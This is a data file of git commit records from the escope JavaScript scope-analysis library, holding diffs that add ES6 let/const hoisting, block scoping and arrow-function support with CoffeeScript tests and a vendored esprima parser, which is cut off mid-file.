17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,2,32,17 Nov 2014,Support hoistable / non-hoistable variables In this commit we fix the let/const declaration behavior. var i = 20; // (1) { i; // (1) let i = 20; // (2) i; // (2) } ref #33,0,1,2,200,9312,"+        this.__hoistable = new Map();<\n>+        this.__nonHoistable = new Map();<\n>+            this.__define(block.id<c> false<c> {<\n>+                this.__defineHoistable(variable<c> false);<\n>+        this.__hoistable = null;<\n>+        this.__nonHoistable = null;<\n>+        if ((variable = this.__hoistable.get(name))) {<\n>+            return this.__resolveVariable(ref<c> variable);<\n>+    Scope.prototype.__resolveVariable = function (ref<c> variable) {<\n>+        variable.references.push(ref);<\n>+        // FIXME: It is broken in ES6.<\n>+        if (ref.from.variableScope === this.variableScope) {<\n>+            variable.stack = false;<\n>+        }<\n>+        if (ref.tainted) {<\n>+            variable.tainted = true;<\n>+            this.taints.set(variable.name<c> true);<\n>+        }<\n>+        ref.resolved = variable;<\n>+        return true;<\n>+    };<\n>+            this.upper.__referencingEagerly(ref);<\n>+    Scope.prototype.__defineHoistable = function (variable<c> hoistable) {<\n>+        var name;<\n>+        name = variable.name;<\n>+        if (hoistable) {<\n>+            this.__nonHoistable['delete'](name);<\n>+            this.__hoistable.set(name<c> variable);<\n>+        } else {<\n>+            if (!this.__hoistable.has(name)) {<\n>+                this.__nonHoistable.set(name<c> variable);<\n>+            }<\n>+        }<\n>+    };<\n>+    Scope.prototype.__define = function __define(node<c> hoistable<c> info) {<\n>+            this.__defineHoistable(variable<c> hoistable);<\n>+        }<\n>+    };<\n>+    // Resolve if the current scope has non hoistable variable.<\n>+    Scope.prototype.__referencingEagerly = function (ref) {<\n>+        var name<c> variable;<\n>+        name = ref.identifier.name;<\n>+        variable = this.__nonHoistable.get(name);<\n>+        if (variable) {<\n>+            this.__resolveVariable(ref<c> variable);<\n>+        } else {<\n>+            this.__left.push(ref);<\n>+            this.__referencingEagerly(ref);<\n>+        var resultScopes<c> scopeManager<c> variableTargetScope<c> hoistable;<\n>+                    currentScope.__define(node.param<c> false<c> {<\n>+                    currentScope.upper.__define(node.id<c> true<c> {<\n>+                        currentScope.__define(node.params[i]<c> false<c> {<\n>+                        currentScope.__define(node.params[i]<c> false<c> {<\n>+                    hoistable = node.kind === 'var';<\n>+                    variableTargetScope = hoistable ? currentScope.variableScope : currentScope;<\n>+                        variableTargetScope.__define(decl.id<c> hoistable<c> {<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+esprima = require 'esprima'<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'arguments'<c> -><\n>+    it 'arguments are correctly materialized'<c> -><\n>+        ast = esprima.parse """"""<\n>+        (function () {<\n>+            arguments;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.isArgumentsMaterialized()).to.be.true<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[0]<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>+    it 'let is not hoistable#1'<c> -><\n>+        ast = harmony.parse """"""<\n>+        var i = 42;<\n>+        {<\n>+            i;  // points global's i<\n>+            let i = 20;<\n>+            i;  // points block scoped i<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 1<\n>+        expect(globalScope.variables[0].name).to.be.equal 'i'<\n>+        expect(globalScope.references).to.have.length 1<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        expect(scope.references).to.have.length 3<\n>+        expect(scope.references[0].resolved).to.be.null  # Since global scope<\n>+        expect(scope.references[1].resolved).to.be.equal scope.variables[0]<\n>+        expect(scope.references[2].resolved).to.be.equal scope.variables[0]<\n>+    it 'let is not hoistable#2'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            var i = 42; // (1)<\n>+            i;  // (1)<\n>+            {<\n>+                i;  // (1)<\n>+                {<\n>+                    i;  // (1)<\n>+                    let i = 20;  // (2)<\n>+                    i;  // (2)<\n>+                }<\n>+                let i = 30;  // (3)<\n>+                i;  // (3)<\n>+            }<\n>+            i;  // (1)<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 4<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'i'<\n>+        v1 = scope.variables[1]<\n>+        expect(scope.references).to.have.length 3<\n>+        expect(scope.references[0].resolved).to.be.equal v1<\n>+        expect(scope.references[1].resolved).to.be.equal v1<\n>+        expect(scope.references[2].resolved).to.be.equal v1<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        v3 = scope.variables[0]<\n>+        expect(scope.references).to.have.length 3<\n>+        expect(scope.references[0].resolved).to.be.equal v1<\n>+        expect(scope.references[1].resolved).to.be.equal v3<\n>+        expect(scope.references[2].resolved).to.be.equal v3<\n>+        scope = scopeManager.scopes[3]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        v2 = scope.variables[0]<\n>+        expect(scope.references).to.have.length 3<\n>+        expect(scope.references[0].resolved).to.be.equal v1<\n>+        expect(scope.references[1].resolved).to.be.equal v2<\n>+        expect(scope.references[2].resolved).to.be.equal v2<\n>",-            this.__define(block.id<c> {<\n>-        if (this.set.has(name)) {<\n>-            variable = this.set.get(name);<\n>-            variable.references.push(ref);<\n>-            variable.stack = variable.stack && ref.from.variableScope === this.variableScope;<\n>-            if (ref.tainted) {<\n>-                variable.tainted = true;<\n>-                this.taints.set(variable.name<c> true);<\n>-            }<\n>-            ref.resolved = variable;<\n>-            return true;<\n>-            this.upper.__left.push(ref);<\n>-    Scope.prototype.__define = function __define(node<c> info) {<\n>-            this.__left.push(ref);<\n>-        var resultScopes<c> scopeManager<c> variableTargetScope;<\n>-                    currentScope.__define(node.param<c> {<\n>-                    currentScope.upper.__define(node.id<c> {<\n>-                        currentScope.__define(node.params[i]<c> {<\n>-                        currentScope.__define(node.params[i]<c> {<\n>-                    variableTargetScope = (node.kind === 'var') ? currentScope.variableScope : currentScope;<\n>-                        variableTargetScope.__define(decl.id<c> {<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,0,22,17 Nov 2014,Ensure FunctionDeclaration is bounded to the block scope. ref #33,0,0,2,28,1297,"+                    // NOTE: Not referring variableScope. It is intended.<\n>+                    // Since<\n>+                    //  in ES5<c> FunctionDeclaration should be in FunctionBody.<\n>+                    //  in ES6<c> FunctionDeclaration should be block scoped.<\n>+    it 'function delaration is materialized in ES6 block scope'<c> -><\n>+        ast = harmony.parse """"""<\n>+        {<\n>+            function test() {<\n>+            }<\n>+            test();<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 3<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'test'<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal('test')<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.references).to.have.length 0<\n>",,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,0,16,17 Nov 2014,Add bindings for parameters in ArrowFunctionExpression,0,0,2,23,1098,"+                case Syntax.ArrowFunctionExpression:<\n>+    it 'generate bindings for parameters'<c> -><\n>+        ast = harmony.parse """"""<\n>+        var arrow = (a<c> b<c> c<c> d) => {<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 1<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.block.type).to.be.equal 'ArrowFunctionExpression'<\n>+        expect(scope.isStrict).to.be.true<\n>+        expect(scope.variables).to.have.length 5<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'a'<\n>+        expect(scope.variables[2].name).to.be.equal 'b'<\n>+        expect(scope.variables[3].name).to.be.equal 'c'<\n>+        expect(scope.variables[4].name).to.be.equal 'd'<\n>",,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,23,57,16 Nov 2014,Add support for ArrowFunctionExpression ref #33,0,1,2,81,3849,"+  Copyright (C) 2012-2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Copyright (C) 2014 Thiago de Arruda <tpadilha84@gmail.com><\n>+        // ArrowFunctionExpression's scope is always strict scope.<\n>+        if (block.type === Syntax.ArrowFunctionExpression) {<\n>+            return true;<\n>+        }<\n>+        // Search 'use strict' directive.<\n>+        // It may return false result. (for example<c> if node is the FunctionBody<c> it may return true under ES6 mode.)<\n>+        // But it will be filtered the subsequent exploring.<\n>+        if (this.__isScopeRequired(node<c> null)) {<\n>+            return node.type === Syntax.FunctionExpression || node.type === Syntax.FunctionDeclaration || node.type === Syntax.ArrowFunctionExpression;<\n>+            if (node.type === Syntax.ArrowFunctionExpression) {<\n>+                return true;<\n>+            }<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'ES6 arrow function expression'<c> -><\n>+    it 'materialize scope for arrow function expression'<c> -><\n>+        ast = harmony.parse """"""<\n>+        var arrow = () => {<\n>+            let i = 0;<\n>+            var j = 20;<\n>+            console.log(i);<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 1<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.block.type).to.be.equal 'ArrowFunctionExpression'<\n>+        expect(scope.isStrict).to.be.true<\n>+        expect(scope.variables).to.have.length 3<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'i'<\n>+        expect(scope.variables[2].name).to.be.equal 'j'<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>+        {<\n>+            let i = 20;<\n>+            i;<\n>+        }<\n>+        {<\n>+            let i = 20;<\n>+            var i = 20;<\n>+            i;<\n>+        }<\n>",-  Copyright (C) 2012-2013 Yusuke Suzuki <utatane.tea@gmail.com><\n>-        if (this.__isScopeRequired(node)) {<\n>-            return node.type === Syntax.FunctionExpression || node.type === Syntax.FunctionDeclaration;<\n>-    let i = 20;<\n>-    i;<\n>-    let i = 20;<\n>-    var i = 20;<\n>-    i;<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,23,44,16 Nov 2014,Fix using ScopeManager#__isScopeRequired,0,0,1,2,89,+        if (this.__isScopeRequired(node)) {<\n>,-        if (Scope.isScopeRequired(node)) {<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,23,31,16 Nov 2014,Add initial code for preparing for adding block based scoping ref #33,0,2,1,4645,186963,"+        var resultScopes<c> scopeManager<c> variableTargetScope;<\n>+                    variableTargetScope = (node.kind === 'var') ? currentScope.variableScope : currentScope;<\n>+                        variableTargetScope.__define(decl.id<c> {<\n>+                            kind: node.kind<c><\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'ES6 block scope'<c> -><\n>+    it 'let is materialized in ES6 block scope#1'<c> -><\n>+        ast = harmony.parse """"""<\n>+    let i = 20;<\n>+    i;<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2  # Program and BlcokStatement scope.<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0  # No variable in Program scope.<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.variables).to.have.length 1  # `i` in block scope.<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        expect(scope.references).to.have.length 2<\n>+        expect(scope.references[0].identifier.name).to.be.equal('i')<\n>+        expect(scope.references[1].identifier.name).to.be.equal('i')<\n>+    it 'let is materialized in ES6 block scope#2'<c> -><\n>+        ast = harmony.parse """"""<\n>+    let i = 20;<\n>+    var i = 20;<\n>+    i;<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2  # Program and BlcokStatement scope.<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 1  # No variable in Program scope.<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.variables).to.have.length 1  # `i` in block scope.<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        expect(scope.references).to.have.length 3<\n>+        expect(scope.references[0].identifier.name).to.be.equal('i')<\n>+        expect(scope.references[1].identifier.name).to.be.equal('i')<\n>+        expect(scope.references[2].identifier.name).to.be.equal('i')<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>+/*<\n>+  Copyright (C) 2013 Ariya Hidayat <ariya.hidayat@gmail.com><\n>+  Copyright (C) 2013 Thaddee Tyl <thaddee.tyl@gmail.com><\n>+  Copyright (C) 2012 Ariya Hidayat <ariya.hidayat@gmail.com><\n>+  Copyright (C) 2012 Mathias Bynens <mathias@qiwi.be><\n>+  Copyright (C) 2012 Joost-Wim Boekesteijn <joost-wim@boekesteijn.nl><\n>+  Copyright (C) 2012 Kris Kowal <kris.kowal@cixar.com><\n>+  Copyright (C) 2012 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Copyright (C) 2012 Arpad Borsos <arpad.borsos@googlemail.com><\n>+  Copyright (C) 2011 Ariya Hidayat <ariya.hidayat@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+/*jslint bitwise:true plusplus:true */<\n>+/*global esprima:true<c> define:true<c> exports:true<c> window: true<c><\n>+throwError: true<c> generateStatement: true<c> peek: true<c><\n>+parseAssignmentExpression: true<c> parseBlock: true<c><\n>+parseClassExpression: true<c> parseClassDeclaration: true<c> parseExpression: true<c><\n>+parseForStatement: true<c><\n>+parseFunctionDeclaration: true<c> parseFunctionExpression: true<c><\n>+parseFunctionSourceElements: true<c> parseVariableIdentifier: true<c><\n>+parseImportSpecifier: true<c><\n>+parseLeftHandSideExpression: true<c> parseParams: true<c> validateParam: true<c><\n>+parseSpreadOrAssignmentExpression: true<c><\n>+parseStatement: true<c> parseSourceElement: true<c> parseConciseBody: true<c><\n>+parseYieldExpression: true<\n>+*/<\n>+(function (root<c> factory) {<\n>+    'use strict';<\n>+    // Universal Module Definition (UMD) to support AMD<c> CommonJS/Node.js<c><\n>+    // Rhino<c> and plain browser loading.<\n>+    /* istanbul ignore next */<\n>+    if (typeof define === 'function' && define.amd) {<\n>+        define(['exports']<c> factory);<\n>+    } else if (typeof exports !== 'undefined') {<\n>+        factory(exports);<\n>+    } else {<\n>+        factory((root.esprima = {}));<\n>+    }<\n>+    'use strict';<\n>+    var Token<c><\n>+        TokenName<c><\n>+        FnExprTokens<c><\n>+        Syntax<c><\n>+        PropertyKind<c><\n>+        Messages<c><\n>+        Regex<c><\n>+        SyntaxTreeDelegate<c><\n>+        ClassPropertyType<c><\n>+        source<c><\n>+        strict<c><\n>+        index<c><\n>+        lineNumber<c><\n>+        lineStart<c><\n>+        length<c><\n>+        delegate<c><\n>+        lookahead<c><\n>+        state<c><\n>+        extra;<\n>+    Token = {<\n>+        BooleanLiteral: 1<c><\n>+        EOF: 2<c><\n>+        Identifier: 3<c><\n>+        Keyword: 4<c><\n>+        NullLiteral: 5<c><\n>+        NumericLiteral: 6<c><\n>+        Punctuator: 7<c><\n>+        StringLiteral: 8<c><\n>+        RegularExpression: 9<c><\n>+        Template: 10<\n>+    };<\n>+    TokenName = {};<\n>+    TokenName[Token.BooleanLiteral] = 'Boolean';<\n>+    TokenName[Token.EOF] = '<end>';<\n>+    TokenName[Token.Identifier] = 'Identifier';<\n>+    TokenName[Token.Keyword] = 'Keyword';<\n>+    TokenName[Token.NullLiteral] = 'Null';<\n>+    TokenName[Token.NumericLiteral] = 'Numeric';<\n>+    TokenName[Token.Punctuator] = 'Punctuator';<\n>+    TokenName[Token.StringLiteral] = 'String';<\n>+    TokenName[Token.RegularExpression] = 'RegularExpression';<\n>+    // A function following one of those tokens is an expression.<\n>+    FnExprTokens = ['('<c> '{'<c> '['<c> 'in'<c> 'typeof'<c> 'instanceof'<c> 'new'<c><\n>+                    'return'<c> 'case'<c> 'delete'<c> 'throw'<c> 'void'<c><\n>+                    // assignment operators<\n>+                    '='<c> '+='<c> '-='<c> '*='<c> '/='<c> '%='<c> '<<='<c> '>>='<c> '>>>='<c><\n>+                    '&='<c> '|='<c> '^='<c> '<c>'<c><\n>+                    // binary/unary operators<\n>+                    '+'<c> '-'<c> '*'<c> '/'<c> '%'<c> '++'<c> '--'<c> '<<'<c> '>>'<c> '>>>'<c> '&'<c><\n>+                    '|'<c> '^'<c> '!'<c> '~'<c> '&&'<c> '||'<c> '?'<c> ':'<c> '==='<c> '=='<c> '>='<c><\n>+                    '<='<c> '<'<c> '>'<c> '!='<c> '!=='];<\n>+    Syntax = {<\n>+        ArrayExpression: 'ArrayExpression'<c><\n>+        ArrayPattern: 'ArrayPattern'<c><\n>+        ArrowFunctionExpression: 'ArrowFunctionExpression'<c><\n>+        AssignmentExpression: 'AssignmentExpression'<c><\n>+        BinaryExpression: 'BinaryExpression'<c><\n>+        BlockStatement: 'BlockStatement'<c><\n>+        BreakStatement: 'BreakStatement'<c><\n>+        CallExpression: 'CallExpression'<c><\n>+        CatchClause: 'CatchClause'<c><\n>+        ClassBody: 'ClassBody'<c><\n>+        ClassDeclaration: 'ClassDeclaration'<c><\n>+        ClassExpression: 'ClassExpression'<c><\n>+        ComprehensionBlock: 'ComprehensionBlock'<c><\n>+        ComprehensionExpression: 'ComprehensionExpression'<c><\n>+        ConditionalExpression: 'ConditionalExpression'<c><\n>+        ContinueStatement: 'ContinueStatement'<c><\n>+        DebuggerStatement: 'DebuggerStatement'<c><\n>+        DoWhileStatement: 'DoWhileStatement'<c><\n>+        EmptyStatement: 'EmptyStatement'<c><\n>+        ExportDeclaration: 'ExportDeclaration'<c><\n>+        ExportBatchSpecifier: 'ExportBatchSpecifier'<c><\n>+        ExportSpecifier: 'ExportSpecifier'<c><\n>+        ExpressionStatement: 'ExpressionStatement'<c><\n>+        ForInStatement: 'ForInStatement'<c><\n>+        ForOfStatement: 'ForOfStatement'<c><\n>+        ForStatement: 'ForStatement'<c><\n>+        FunctionDeclaration: 'FunctionDeclaration'<c><\n>+        FunctionExpression: 'FunctionExpression'<c><\n>+        Identifier: 'Identifier'<c><\n>+        IfStatement: 'IfStatement'<c><\n>+        ImportDeclaration: 'ImportDeclaration'<c><\n>+        ImportDefaultSpecifier: 'ImportDefaultSpecifier'<c><\n>+        ImportNamespaceSpecifier: 'ImportNamespaceSpecifier'<c><\n>+        ImportSpecifier: 'ImportSpecifier'<c><\n>+        LabeledStatement: 'LabeledStatement'<c><\n>+        Literal: 'Literal'<c><\n>+        LogicalExpression: 'LogicalExpression'<c><\n>+        MemberExpression: 'MemberExpression'<c><\n>+        MethodDefinition: 'MethodDefinition'<c><\n>+        ModuleSpecifier: 'ModuleSpecifier'<c><\n>+        NewExpression: 'NewExpression'<c><\n>+        ObjectExpression: 'ObjectExpression'<c><\n>+        ObjectPattern: 'ObjectPattern'<c><\n>+        Program: 'Program'<c><\n>+        Property: 'Property'<c><\n>+        ReturnStatement: 'ReturnStatement'<c><\n>+        SequenceExpression: 'SequenceExpression'<c><\n>+        SpreadElement: 'SpreadElement'<c><\n>+        SwitchCase: 'SwitchCase'<c><\n>+        SwitchStatement: 'SwitchStatement'<c><\n>+        TaggedTemplateExpression: 'TaggedTemplateExpression'<c><\n>+        TemplateElement: 'TemplateElement'<c><\n>+        TemplateLiteral: 'TemplateLiteral'<c><\n>+        ThisExpression: 'ThisExpression'<c><\n>+        ThrowStatement: 'ThrowStatement'<c><\n>+        TryStatement: 'TryStatement'<c><\n>+        UnaryExpression: 'UnaryExpression'<c><\n>+        UpdateExpression: 'UpdateExpression'<c><\n>+        VariableDeclaration: 'VariableDeclaration'<c><\n>+        VariableDeclarator: 'VariableDeclarator'<c><\n>+        WhileStatement: 'WhileStatement'<c><\n>+        WithStatement: 'WithStatement'<c><\n>+        YieldExpression: 'YieldExpression'<\n>+    };<\n>+    PropertyKind = {<\n>+        Data: 1<c><\n>+        Get: 2<c><\n>+        Set: 4<\n>+    };<\n>+    